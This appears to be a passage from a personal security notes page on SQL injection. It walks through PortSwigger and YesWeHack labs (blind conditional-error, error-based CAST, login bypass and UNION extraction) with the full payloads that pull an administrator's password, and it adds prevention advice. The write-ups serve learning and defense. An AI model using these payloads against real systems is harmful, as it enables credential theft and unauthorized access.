+<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p>
+<p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p>
+<p>To solve the lab, log in as the <code>administrator</code> user.
+These attacks depend on excessive database user privileges.</p>
+<div class="admonition alert">
+<p class="admonition-title">Hint</p>
+<p>We're also given a hint that this is an Oracle database.</p>
+</div>
+</div>
+<p>This lab is similar to the previous ones where the application is using a tracking cookie that we can inject into. </p>
+<p>Using the following payload confirms that a) the database is Oracle, and b) the application is SQL injectable. </p>
+<div class="highlight"><pre><span></span><code>&#39;||(SELECT &#39;&#39; FROM dual)||&#39;
+</code></pre></div>
+<p>We can use the following payload from the PortSwigger SQLi cheatsheet to test this a bit more:</p>
+<div class="highlight"><pre><span></span><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+</code></pre></div>
+<p>So the query looks like this:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250812195354.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250812195354.png" /></a></p>
+<p>Note the error message when using 1=1. This is because since the 1=1 statement always evaluates to true, the <code>1/0</code> gets evaluated which causes a divide by zero error. The 1=2 statement evaluates to false, so the <code>1/0</code> does NOT get evaluated, so we don't get an error.</p>
+<p>To figure out how many characters the password has, we can use the following payload:</p>
+<div class="highlight"><pre><span></span><code>&#39;||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</code></pre></div>
+<p>Then we can use automate/intruder to make this a bit quicker.</p>
+<p>Note the error is triggered at payload 20...meaning that "password &gt; 20" is false (since it returns a 200 -- no error). So we know the Administrator's password is 20 characters long.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250812202453.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250812202453.png" /></a></p>
+<p>Now we can start trying to figure out the password. I'm using the following payload for that:</p>
+<div class="highlight"><pre><span></span><code>&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;a&#39; THEN to_char(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;
+</code></pre></div>
+<p>After running it through intruder, the password is there (just not presented nicely like Caido does)</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250812203653.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250812203653.png" /></a></p>
+<p>Administrator password</p>
+<div class="highlight"><pre><span></span><code>zhm0aveqcwd1q2rzcxnq
+</code></pre></div>
+<p>Log in as the administrator to solve the lab. </p>
+</details>
+<p>It may also be possible to extract data through generating errors that contain information returned from the SQL query. </p>
+<h5 id="cast">Cast<a class="headerlink" href="#cast" title="Permanent link">&para;</a></h5>
+<p>It may be possible to trigger such an error by trying to cast the result of the query (probably a string) to an incompatible data type like an integer. </p>
+<div class="highlight"><pre><span></span><code>CAST((SELECT example_column FROM example_table) AS int)
+</code></pre></div>
+<details class="example">
+<summary>PortSwigger SQL Injection Lab: Visible error-based SQL injection</summary>
+<div class="admonition info">
+<p class="admonition-title">Lab Instructions</p>
+<p>This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.</p>
+<p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. To solve the lab, find a way to leak the password for the <code>administrator</code> user, then log in to their account.</p>
+</div>
+<p>In this lab, we find that errors are returned, so we can see the output. Note the error returned from the following payload:</p>
+<div class="highlight"><pre><span></span><code>&#39; AND CAST((SELECT 1) AS int)--
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250813054527.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250813054527.png" /></a></p>
+<p>We can just set that to evaluate to <code>1=1</code> as follows:</p>
+<div class="highlight"><pre><span></span><code>&#39; AND 1=CAST((SELECT 1) AS int)--
+</code></pre></div>
+<p>Now we get a 200 OK. Now...we need to figure out how to get data out of this. </p>
+<p>Send the following payload, and note that the output ("administrator") is shown in the error message.</p>
+<div class="highlight"><pre><span></span><code>x&#39; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250813055211.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250813055211.png" /></a></p>
+<p>Cool...now we can start trying to extract some more valuable information. </p>
+<p>Using the same general principle that we used to extract the first username, we can also extract the first password as follows:</p>
+<div class="highlight"><pre><span></span><code>x&#39; AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250813055810.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250813055810.png" /></a></p>
+<p>Now we can log in as the administrator and complete the lab. </p>
+</details>
+<ul>
+<li>
+<p><strong>File System Access</strong>: Using database functions like <code>LOAD_FILE()</code> to read sensitive files from the server (e.g., <code>/etc/passwd</code>).</p>
+</li>
+<li>
+<p><strong>Remote Code Execution (RCE)</strong>: Using database features like <code>xp_cmdshell</code> (MS-SQL) or user-defined functions to execute operating system commands on the server.</p>
+</li>
+</ul>
+<hr />
+<h2 id="prevention-methods">Prevention Methods<a class="headerlink" href="#prevention-methods" title="Permanent link">&para;</a></h2>
+<h3 id="parameterized-queries">Parameterized Queries<a class="headerlink" href="#parameterized-queries" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p><strong>Also known as</strong>: Prepared Statements.</p>
+</li>
+<li>
+<p><strong>Concept</strong>: This method strictly separates the SQL query logic from the user-supplied data. The query structure is sent and compiled first, then the data is sent separately and safely bound to the query.</p>
+</li>
+<li>
+<p><strong>Why it works</strong>: User input is <strong>always treated as data, never as executable code</strong>. The <code>' OR '1'='1'</code> payload fails because the database literally looks for a value with that string, which doesn't exist.</p>
+</li>
+</ul>
+<h3 id="defense-in-depth-strategy">Defense-in-Depth Strategy<a class="headerlink" href="#defense-in-depth-strategy" title="Permanent link">&para;</a></h3>
+<p>Using multiple layers of security.</p>
+<ol>
+<li>
+<p><strong>Input Validation</strong>: Check if user input is in the expected format (e.g., is it an integer?) before processing it. Use <strong>allow-listing</strong> (only accepting known-good formats).</p>
+</li>
+<li>
+<p><strong>Principle of Least Privilege</strong>: The application's database account should only have the absolute minimum permissions needed to function. This limits the damage if an injection occurs.</p>
+</li>
+<li>
+<p><strong>Web Application Firewall (WAF)</strong>: A device or service that inspects traffic and blocks requests that match known-bad attack signatures. A good layer, but not a substitute for secure code.</p>
+</li>
+</ol>
+<hr />
+<h2 id="advanced-topics">Advanced Topics<a class="headerlink" href="#advanced-topics" title="Permanent link">&para;</a></h2>
+<h3 id="second-order-sqli">Second-Order SQLi<a class="headerlink" href="#second-order-sqli" title="Permanent link">&para;</a></h3>
+<p>A two-step attack where a malicious payload is first safely stored in the database, only to be executed later when a different, vulnerable function retrieves and uses that data insecurely.</p>
+<h3 id="out-of-band-oob-sqli">Out-of-Band (OOB) SQLi<a class="headerlink" href="#out-of-band-oob-sqli" title="Permanent link">&para;</a></h3>
+<p>An exfiltration method where the attacker forces the database to make an external network request (e.g., DNS or HTTP) to a server they control, sending data within that request.</p>
+<h3 id="automation-sqlmap">Automation (SQLMap)<a class="headerlink" href="#automation-sqlmap" title="Permanent link">&para;</a></h3>
+<p>A powerful open-source tool that automates the entire process of detecting, exploiting, and exfiltrating data via SQL injection.</p>
+<hr />
+<h2 id="other-labs">Other Labs<a class="headerlink" href="#other-labs" title="Permanent link">&para;</a></h2>
+<details class="example">
+<summary>YesWeHack Dojo - SQL Injection</summary>
+<p><strong>Lab 1 - Simple Login Bypass</strong></p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803122836.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803122836.png" /></a></p>
+<p>Payload:</p>
+<div class="highlight"><pre><span></span><code>pass&#39; or &#39;1&#39;=&#39;1
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803123043.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803123043.png" /></a></p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803123055.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803123055.png" /></a></p>
+<p><strong>Lab 2: First Exfiltration</strong></p>
+<p>This level has a hint as follows </p>
+<p>"<code>UNION</code> can be used to combine the results from different queries."</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803134156.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803134156.png" /></a></p>
+<p>Sending "admin" gives us the email address for the admin user:</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803134253.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803134253.png" /></a></p>
+<p>Now we can try using a <code>UNION</code> to extract the password.</p>
+<p>This took a little bit of tinkering, but I eventually got the following payload working:</p>
+<div class="highlight"><pre><span></span><code>admin%&#39; UNION SELECT null,password FROM users WHERE email LIKE &#39;%admin%&#39;-- -
+</code></pre></div>
+<p><a class="glightbox" href="../../../../assets/screenshots/sqli/Pasted%20image%2020250803134858.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/sqli/Pasted%20image%2020250803134858.png" /></a></p>
+</details>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../OS-command-injection/index.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: Command Injection">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Command Injection
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../methodologies/web-apps/owasp-wstg.html" class="md-footer__link md-footer__link--next" aria-label="Next: OWASP WSTG">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                OWASP WSTG
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright © 2025 Tom Fieber
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
+      
+        <script src="../../../../javascripts/tablesort.js"></script>
+      
+        <script src="../../../../javascripts/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
